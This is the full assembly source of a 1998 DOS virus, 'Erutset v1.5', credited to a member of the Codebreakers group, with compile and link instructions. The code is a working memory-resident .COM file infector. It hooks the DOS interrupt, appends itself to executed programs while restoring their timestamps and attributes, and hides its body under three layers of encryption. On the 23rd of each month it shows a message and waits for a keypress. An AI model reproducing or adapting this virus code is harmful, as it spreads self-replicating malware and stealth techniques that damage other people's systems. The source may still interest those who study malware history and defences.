; ------------------------------------------------------------------------- ;
;         Erutset v1.5 coded by KilJaeden of the Codebreakers 1998          ;
; ------------------------------------------------------------------------- ;
; Description: `-------------------| Started: 19/06/98 | Finished: 19/06/98 ;
;                                  `-------------------^------------------- ;
; v1.0 - Memory resident .com appender, infects upon execution  | Size: 637 ;
; v1.1 - restores time/date & attributes also infects readonly  `---------- ;
; v1.2 - now has a single layer of XOR,NEG,ROR encryption                   ;
; v1.3 - added a second layer of XOR,NEG,NOT,ROR,ROL encryption             ;
; v1.4 - added a third layer of XOR,NEG,NOT,ROR,ROL encryption              ;
; v1.5 - added a small payload, prints a string and waits for keypress      ;
; ------------------------------------------------------------------------- ;
; --------> Dedicated to the hate of all the '31337 h4x0rs' on IRC <------- ;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm erutset.asm                                           ;
; to link :::::] tlink /t erutset.obj                                       ;
; ------------------------------------------------------------------------- ;

code    segment                                 ; name our segment 'code'
        assume  cs:code,ds:code                 ; assign CS and DS to code
        org     100h                            ; this be a .com file
        .286                                    ; needed for pusha/popa
        jumps                                   ; save space wasted jumping

blank:  db      0e9h,0,0                        ; jump to start of code
start:  call    delta                           ; push IP on to stack
delta:  pop     bp                              ; pop it into bp
        sub     bp,offset delta                 ; get the delta offset

decr:   jmp     once                            ; jump to once (overwritten)
        lea     si,[bp+encd]                    ; load the source index up
        mov     di,si                           ; move it into DI
        call    encr                            ; decrypt the 1st layer

; --------------------( Start Of 1st Encryption Blanket )------------------ ;
; ------------------------------------------------------------------------- ;

encd:   lea     si,[bp+d_encd]                  ; load the source index up
        mov     di,si                           ; move it into DI again
        mov     cx,d_encr-d_encd                ; # of bytes to decrypt
        call    d_encr                          ; decrypt the 2nd layer

; --------------------( Start Of 2nd Encryption Blanket )------------------ ;
; ------------------------------------------------------------------------- ;

d_encd: lea     si,[bp+t_encd]                  ; load the source index up
        mov     di,si                           ; move it into DI again
        mov     cx,t_encr-t_encd                ; # of bytes to decrypt
        call    t_encr                          ; decrypt the 3rd layer

; --------------------( Start Of 3rd Encryption Blanket )------------------ ;
; ------------------------------------------------------------------------- ;

t_encd: call    pload                           ; check if payload time

        mov     ax,0deadh                       ; check if already resident
        int     21h                             ; if we are, bx = 0deadh now
        cmp     bx,0deadh                       ; does bx hold 0deadh ?
        je      first3                          ; we are already resident!

        sub     word ptr cs:[2],80h             ; lower top of PSP mem data
        mov     ax,cs                           ; move CS into AX
        dec     ax                              ; decrement AX
        mov     ds,ax                           ; move AX into DS
        sub     word ptr ds:[3],80h             ; sub 2kb from accessed MCB
        xor     ax,ax                           ; xor the value in ax to 0
        mov     ds,ax                           ; move that value into DS
        sub     word ptr ds:[413h],2            ; adjust BIOS data by 2kb
        mov     ax,word ptr ds:[413h]           ; move adjusted BIOS data
        mov     cl,6                            ; load cl with value of 6
        shl     ax,cl                           ; multiply BIOS mem by 64
        mov     es,ax                           ; move value into ES
        push    cs                              ; push value of code segment
        pop     ds                              ; into data segment register
        xor     di,di                           ; xor value in DI to 0
        lea     si,[bp+start]                   ; load the source index
        mov     cx,finished-start               ; # of bytes to load up
        rep     movsb                           ; load virus into memory

        xor     ax,ax                           ; value in ax to 0
        mov     ds,ax                           ; move value into DS
        lea     ax,isr                          ; point IVT to new ISR
        sub     ax,offset start                 ; subtract start offset
        mov     bx,es                           ; move es into bx

        cli                                          ; interrupts off
        xchg    ax,word ptr ds:[84h]                 ; switch old/new int 21h
        xchg    bx,word ptr ds:[86h]                 ; switch old/new int 21h
        mov     word ptr es:[oi21-offset start],ax   ; save the old int 21h
        mov     word ptr es:[oi21+2-offset start],bx ; save the old int 21h
        sti                                          ; interrupts on

        push    cs cs                           ; push code segment twice
        pop     ds es                           ; into DS and ES registers

first3: lea     si,[bp+saved]                   ; load up the source index
        mov     di,100h                         ; load the destination index
        push    di                              ; push 100h on to the stack
        movsw                                   ; move two bytes now
        movsb                                   ; move one byte now
        retn                                    ; return control to host

; ------------------------------------------------------------------------- ;
; ------------------------------------------------------------------------- ;

isr:    pushf                                   ; push all flags
        cmp     ax,0deadh                       ; are we testing if resident?
        jne     exec                            ; nope, check for execution
        mov     bx,0deadh                       ; yup, show them we are here
        popf                                    ; pop all flags
        iret                                    ; pop cs:ip+flags from stack

exec:   pusha                                   ; push all registers
        push    ds                              ; push data segment register
        push    es                              ; push extra segment register
        cmp     ah,4bh                          ; something being executed?
        je      infect                          ; yup! infect the file
exit:   pop     es                              ; pop ES from the stack
        pop     ds                              ; pop DS from the stack
        popa                                    ; pop all registers
        popf                                    ; pop all flags
old21:  db      0eah                            ; jump to original ISR
        oi21    dd ?                            ; old int 21 goes here
        ret                                     ; return from call

; ------------------------------------------------------------------------- ;
; ------------------------------------------------------------------------- ;

infect: push    bp                              ; save original delta offset
        call    tsrdel                          ; push IP on to stack again
tsrdel: pop     bp                              ; pop it into bp
        sub     bp,offset tsrdel                ; get the 2nd delta offset

        push    ds                              ; push DS on to stack
        pop     es                              ; pop it into es
        mov     di,dx                           ; move file handle into di
        mov     cx,64                           ; 64 byte filename possible
        mov     al,'.'                          ; load al with the .
        cld                                     ; clear direction flag
        repnz   scasb                           ; scan until . is hit
        cmp     word ptr ds:[di],'OC'           ; is the file .CO- ?
        jne     abort                           ; not it isn't, abort
        cmp     word ptr ds:[di+2],'M'          ; is the file .--M ?
        jne     abort                           ; no it isn't, abort

        mov     ax,4300h                        ; get file attributes
        int     21h                             ; get them now
        push    cx                              ; push the attributes
        push    dx                              ; push the file name

        mov     ax,4301h                        ; set file attributes
        xor     cx,cx                           ; to no attributes at all
        int     21h                             ; ready for infection

        mov     ax,3d02h                        ; open the file read/write
        int     21h                             ; open the file now
        xchg    bx,ax                           ; move the file handle

        push    cs cs                           ; push CS on to stack twice
        pop     ds es                           ; pop it into DS and ES

        mov     ax,5700h                        ; get time/date stamps
        int     21h                             ; get them now
        push    dx                              ; save the date
        push    cx                              ; save the time

        mov     ah,3fh                          ; the read function
        lea     dx,[bp+saved]                   ; record the bytes here
        mov     cx,3                            ; read first three bytes
        int     21h                             ; first three recorded

        mov     ax,4202h                        ; scan to end of file
        xor     cx,cx                           ; xor value of cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; DX:AX = file size now!

        cmp     dx,0                            ; is the file < 65,535 bytes?
        jne     close                           ; way to big, close it up
        mov     cx,word ptr [bp+saved+1]        ; move buffer+1 into cx
        add     cx,finished-start+3             ; virus size + jump
        cmp     ax,cx                           ; compare the two
        jz      close                           ; if equal, close it up

        sub     ax,3                            ; get jump to virus body size
        mov     word ptr [bp+newjump+1],ax      ; write as our new jump

        mov     ax,4200h                        ; point to start of file
        xor     cx,cx                           ; xor value of cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; pointing to SOF

        mov     ah,40h                          ; write to file
        mov     cx,3                            ; write three bytes
        lea     dx,[bp+newjump]                 ; write the jump
        int     21h                             ; jump is written

        mov     ax,4202h                        ; point to end of file
        xor     cx,cx                           ; xor value of cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; pointing to EOF

        lea     si,[bp+start]                   ; load the source index
        lea     di,[bp+buffer]                  ; load the destination index
        mov     cx,finished-start               ; # of bytes to put in mem
        rep     movsb                           ; load virus into memory

        lea     di,[bp+t_encd-start+buffer]     ; load the source index
        mov     si,di                           ; load the destination index
        mov     cx,t_encr-t_encd                ; # of bytes to encrypt
        call    t_encr                          ; encrypt the 1st layer

        lea     si,[bp+d_encd-start+buffer]     ; load the source index
        mov     di,si                           ; load the destination index
        mov     cx,d_encr-d_encd                ; # of bytes to encrypt
        call    d_encr                          ; encrypt the 2nd layer

        lea     di,[bp+encd-start+buffer]       ; load the destination index
        mov     si,di                           ; load the source index
        mov     cx,encr-encd                    ; # of bytes to encrypt
        call    encr                            ; encrypt the 3rd layer

        mov     ah,40h                          ; write to file
        mov     cx,finished-start               ; # of bytes to write
        lea     dx,[bp+buffer]                  ; write from mem
        int     21h                             ; write the bytes now

close:  mov     ax,5701h                        ; set time / date stamps
        pop     cx                              ; restore the time
        pop     dx                              ; restore the date
        int     21h                             ; time / date is restored

        mov     ax,4301h                        ; set file attributes
        pop     dx                              ; for this file name
        pop     cx                              ; with these attributes
        int     21h                             ; attributes are restored

        mov     ah,3eh                          ; close up the file
        int     21h                             ; file is closed

abort:  pop     bp                              ; pop original delta offset
        jmp     exit                            ; point to original ISR

; ------------------------------------------------------------------------- ;
; ------------------------------------------------------------------------- ;

        saved   db 0cdh,20h,0                   ; our saved bytes
        newjump db 0e9h,0,0                     ; the soon to be jump
        pldmsg  db '',10,13
                db '  Infected with :: Erutset :: coded by KilJaeden of the Codebreakers 1998',10,13,'$'
; ------------------------------------------------------------------------- ;
; ------------------------------------------------------------------------- ;

pload:  mov     ah,2ah                          ; get system time
        int     21h                             ; get it now
        cmp     dl,23                           ; is it the 23rd?
        jne     endpld                          ; nope, end the payload
        mov     ah,09h                          ; print a string
        lea     dx,[bp+pldmsg]                  ; our message
        int     21h                             ; print our message
        mov     ah,00h                          ; wait for keypress
        int     16h                             ; make them see us
endpld: ret                                     ; return from call

; --------------------( End Of 3rd Encryption Blanket )-------------------- ;
; ------------------------------------------------------------------------- ;

t_encr: lodsb                                   ; load a byte
        xor     al,0C4h                         ;-----[1]
        ror     al,4                            ;----[2]
        not     al                              ;---[3]
        neg     al                              ;--[4]
        rol     al,4                            ;-[5]
        neg     al                              ;--[4]
        not     al                              ;---[3] 
        ror     al,4                            ;----[2]
        xor     al,0C4h                         ;-----[1]
        stosb                                   ; store a byte
        loop    t_encr                          ; do all the bytes
        ret                                     ; return from call

; --------------------( End Of 2nd Encryption Blanket )-------------------- ;
; ------------------------------------------------------------------------- ;

d_encr: lodsb                                   ; load a byte
        neg     al                              ;---------[1]
        ror     al,4                            ;--------[2]
        not     al                              ;-------[3]
        neg     al                              ;------[4]
        rol     al,4                            ;-----[5]
        not     al                              ;----[6]
        ror     al,4                            ;---[7]
        neg     al                              ;--[8]
        xor     al,069h                         ;-[9] encryption/decryption
        neg     al                              ;--[8]
        ror     al,4                            ;---[7]
        not     al                              ;----[6]
        rol     al,4                            ;-----[5]
        neg     al                              ;------[4]
        not     al                              ;-------[3]
        ror     al,4                            ;--------[2]
        neg     al                              ;---------[1]
        stosb                                   ; store the byte
        loop    d_encr                          ; do all the bytes
        ret                                     ; return from call

; --------------------( End Of 1st Encryption Blanket )-------------------- ;
; ------------------------------------------------------------------------- ;

encr:   lodsb                                   ; load a byte
        neg     al                              ;---[1]
        ror     al,4                            ;--[2]
        xor     al,0C4h                         ;-[3] encryption/decryption
        ror     al,4                            ;--[2]
        neg     al                              ;---[1]
        stosb                                   ; store the byte
        loop    encr                            ; do all the bytes
        ret                                     ; return from call

; ------------------------------------------------------------------------- ;
; ------------------------------------------------------------------------- ;

        buffer:                                 ; save our virus in mem
        finished:                               ; end of the virus

once:   lea     si,[bp+new]                     ; load the source index
        lea     di,[bp+decr]                    ; load the destination index
        movsw                                   ; move two bytes
        movsb                                   ; move one byte
        jmp     t_encd                          ; jump to encrypted area
new:    mov     cx,encr-encd                    ; this replaces the jump

        code    ends                            ; end code segment
        end     blank                           ; end / where to start

; ------------------------------------------------------------------------- ;
; ---------> How Can You Think Freely In The Shadow Of A Church? <--------- ;
; ------------------------------------------------------------------------- ;
